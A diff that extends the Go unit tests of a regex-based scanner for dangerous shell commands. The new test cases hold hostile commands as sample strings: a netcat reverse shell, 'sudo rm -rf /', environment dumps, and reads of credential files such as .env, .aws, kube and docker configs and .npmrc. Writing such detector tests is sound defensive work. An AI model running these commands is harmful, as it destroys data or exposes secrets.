@@ -52,6 +52,62 @@ func TestRegexScanner_Scan(t *testing.T) {
 			content:     "nc -e /bin/sh 10.0.0.1 1234",
 			wantFinding: "Reverse Shell",
 		},
+		// New Tests
+		{
+			name:        "Sudo Usage",
+			content:     "sudo rm -rf /",
+			wantFinding: "Sudo Usage",
+		},
+		{
+			name:        "Dump Env (printenv)",
+			content:     "printenv",
+			wantFinding: "Secret Dump",
+		},
+		{
+			name:        "Dump Env (env on own line)",
+			content:     "env",
+			wantFinding: "Secret Dump",
+		},
+		{
+			name:        "Safe Env Usage (shebang)",
+			content:     "#!/usr/bin/env python",
+			wantFinding: "",
+		},
+		{
+			name:        "Safe Env Usage (with args)",
+			content:     "env FOO=bar command",
+			wantFinding: "", // Should not match bare 'env' regex
+		},
+		{
+			name:        "Cat .env",
+			content:     "cat .env",
+			wantFinding: "Dangerous Command",
+		},
+		{
+			name:        "Grep .aws",
+			content:     "grep -r . .aws",
+			wantFinding: "Dangerous Command",
+		},
+		{
+			name:        "Cat Kube Config",
+			content:     "cat ~/.kube/config",
+			wantFinding: "Dangerous Command",
+		},
+		{
+			name:        "More Docker Config",
+			content:     "more ~/.docker/config.json",
+			wantFinding: "Dangerous Command",
+		},
+		{
+			name:        "Tail .npmrc",
+			content:     "tail -n 10 .npmrc",
+			wantFinding: "Dangerous Command",
+		},
+		{
+			name:        "Vim /etc/hosts",
+			content:     "vim /etc/hosts",
+			wantFinding: "Dangerous Command",
+		},
 	}
 
 	for _, tt := range tests {
@@ -63,6 +119,8 @@ func TestRegexScanner_Scan(t *testing.T) {
 
 			if tt.wantFinding == "" {
 				if len(findings) > 0 {
+					// Check if findings are real or false positives for empty expectation
+					// For "Safe Env Usage (with args)", if our regex matches "env ", it might fail.
 					t.Errorf("Expected no findings, got %d: %v", len(findings), findings)
 				}
 			} else {
